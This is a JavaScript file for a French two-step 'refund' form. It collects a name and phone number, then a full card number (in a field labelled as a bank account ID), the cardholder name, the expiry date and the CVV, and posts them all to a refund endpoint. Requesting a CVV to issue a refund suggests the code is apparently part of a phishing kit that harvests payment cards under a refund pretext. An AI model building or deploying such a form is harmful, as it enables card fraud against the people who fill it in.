const step1 = document.getElementById('step-1');
const step2 = document.getElementById('step-2');
const indicator1 = document.getElementById('indicator-1');
const indicator2 = document.getElementById('indicator-2');
const form = document.getElementById('remboursement-form');
const btnContinue = document.getElementById('btn-continue');
const btnBack = document.getElementById('btn-back');
const btnSubmit = document.getElementById('btn-submit');
const successMessage = document.getElementById('success-message');
const alertError = document.getElementById('alert-error');

function showError(fieldId, message) {
  const input = document.getElementById(fieldId);
  const errorEl = document.getElementById(`error-${fieldId}`);
  input.classList.add('invalid');
  errorEl.textContent = message;
}

function clearError(fieldId) {
  const input = document.getElementById(fieldId);
  const errorEl = document.getElementById(`error-${fieldId}`);
  input.classList.remove('invalid');
  errorEl.textContent = '';
}

function validateStep1() {
  let valid = true;
  const nom = document.getElementById('nom').value.trim();
  const telephone = document.getElementById('telephone').value.trim();

  clearError('nom');
  clearError('telephone');

  if (!nom) {
    showError('nom', 'Veuillez entrer votre nom.');
    valid = false;
  }

  if (!telephone || telephone.length < 8) {
    showError('telephone', 'Veuillez entrer un numero valide.');
    valid = false;
  }

  return valid;
}

function validateStep2() {
  let valid = true;
  const rib = document.getElementById('rib').value.trim();
  const nomCompte = document.getElementById('nomCompte').value.trim();
  const date = document.getElementById('date').value.trim();
  const CVV = document.getElementById('CVV').value.trim();

  ['rib', 'nomCompte', 'date', 'CVV'].forEach(clearError);

  const cardNumber = rib.replace(/\s/g, '');

  if (!/^\d{16}$/.test(cardNumber)) {
    showError('rib', 'Le numero de carte doit contenir 16 chiffres.');
    valid = false;
  }

  if (!nomCompte) {
    showError('nomCompte', 'Veuillez entrer le nom du titulaire.');
    valid = false;
  }

  if (!/^\d{2}\/\d{2}$/.test(date)) {
    showError('date', 'Format : MM/AA');
    valid = false;
  }

  if (!/^\d{3,4}$/.test(CVV)) {
    showError('CVV', 'CVV invalide.');
    valid = false;
  }

  return valid;
}

function goToStep2() {
  step1.classList.remove('active');
  step2.classList.add('active');

  const nom = document.getElementById('nom').value.trim();
  document.getElementById('nomCompte').value = nom;
}

function goToStep1() {
  step2.classList.remove('active');
  step1.classList.add('active');
}

function formatCardNumber(value) {
  const digits = value.replace(/\D/g, '').substring(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
}

function formatExpiry(value) {
  const digits = value.replace(/\D/g, '').substring(0, 4);
  if (digits.length >= 2) {
    return digits.substring(0, 2) + '/' + digits.substring(2);
  }
  return digits;
}

document.getElementById('rib').addEventListener('input', function (e) {
  e.target.value = formatCardNumber(e.target.value);
  if (e.target.value.replace(/\s/g, '').length > 0) clearError('rib');
});

document.getElementById('date').addEventListener('input', function (e) {
  e.target.value = formatExpiry(e.target.value);
  if (e.target.value) clearError('date');
});

document.getElementById('CVV').addEventListener('input', function (e) {
  e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
  if (e.target.value) clearError('CVV');
});

document.getElementById('nom').addEventListener('input', () => clearError('nom'));
document.getElementById('telephone').addEventListener('input', () => clearError('telephone'));
document.getElementById('nomCompte').addEventListener('input', () => clearError('nomCompte'));

btnContinue.addEventListener('click', () => {
  if (validateStep1()) goToStep2();
});

btnBack.addEventListener('click', goToStep1);

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  alertError.classList.add('hidden');

  if (!validateStep2()) return;

  btnSubmit.disabled = true;
  btnSubmit.textContent = 'Envoi en cours...';

  const data = {
    nom: document.getElementById('nom').value.trim(),
    telephone: document.getElementById('telephone').value.trim(),
    rib: document.getElementById('rib').value.trim().replace(/\s/g, ''),
    nomCompte: document.getElementById('nomCompte').value.trim(),
    date: document.getElementById('date').value.trim(),
    CVV: document.getElementById('CVV').value.trim(),
  };

  try {
    const res = await fetch('/api/remboursement', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });

    const result = await res.json();

    if (!res.ok) throw new Error(result.error || 'Erreur inconnue');

    step2.classList.remove('active');
    successMessage.classList.remove('hidden');
  } catch (err) {
    alertError.textContent = err.message;
    alertError.classList.remove('hidden');
    alertError.classList.add('error');
    btnSubmit.disabled = false;
    btnSubmit.textContent = 'Enregistrer et confirmer';
  }
});
